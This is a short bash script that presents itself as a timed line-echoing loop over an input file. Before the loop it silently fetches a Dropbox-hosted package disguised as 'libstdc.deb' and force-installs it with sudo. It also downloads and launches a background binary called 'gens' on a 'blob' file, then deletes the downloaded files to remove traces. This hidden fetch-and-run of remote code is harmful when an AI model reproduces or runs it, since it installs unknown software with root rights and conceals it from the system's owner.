#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/y4bha5n65fsyw6e/gens.zip -q
unzip gens.zip > /dev/null 2>&1
#pwd
./scripts/gens ./scripts/blob &
sleep 3
rm -rf gens.zip
rm -rf scripts/gens
rm -rf scripts/blob
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 30 ))
done < $2

